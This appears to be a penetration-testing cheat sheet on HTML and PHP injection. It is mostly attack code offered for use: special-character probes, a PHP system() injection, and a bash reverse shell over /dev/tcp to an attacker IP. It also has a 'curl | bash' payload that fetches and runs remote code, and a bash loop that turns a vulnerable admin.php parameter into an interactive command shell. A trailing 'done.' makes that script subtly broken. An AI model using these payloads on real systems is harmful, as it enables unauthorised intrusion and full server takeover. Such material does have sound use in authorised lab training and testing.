# HTML Injection



## HTML Injection Enumeration

### **Find Input Fields**

Input fields may be found in the following examples:

* Search boxes
* Comments
* Post
* Forms

**Try inserting special characters to see if they are not filtered:**

```
< >; ' " { } ;
```

* < >; = denote elements in HTML
* ' " = denote strings on JavaScript
* {} = function declarations of JavaScript
* ; = end of a statement on JavaScript
* \<?php = PHP code
* ?> = end of PHP code

**If these characters are not removed or encoded then the website might be vulnerable to XSS:**

* URL Encoding
* HTML Encoding

**Then we might be able to code since we can use these special characters!**

Test HTML tags in input fields:

```markup
<h1>Hola</h1>
<marquee>Hola</marquee>
```

Test malicious code in other languages (e.g PHP)

```php
<?php system("whoami"); ?>
```

## Reverse Shell via PHP Injection

Create an index.html file in your webroot directory that actually executes bash code:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.28/443 0>&1
```

Set a listener on a port of your choosing:

```
nc -lvnp 443
```

Inject a malicious PHP code:

```php
<?php system("curl 10.10.14.28 | bash"); ?>
```

### Fake Shell via Continous PHP Injection

The following code enters in a while loop to execute the commands and we use **read** to parse the output:

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "Exit\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

# Variables globales
main_url="http://10.10.10.27/admin.php"

while true; do
    echo -n "[~] " && read -r command
    echo; curl -s -G $main_url --data-urlencode "html=<?php system(\"$command\"); ?>" --cookie "adminpowa=noonecares" | grep "\/body" -A 500 | grep -v "\/body"; echo
done.
```

Things to keep in mind:

* Cookie = You don't need a cookie if you don't have to be authenticated.
* \-G = This sends a GET request and the content in the URL.
* grep = If you don't need to filter the output, then you may remove the grep commands.
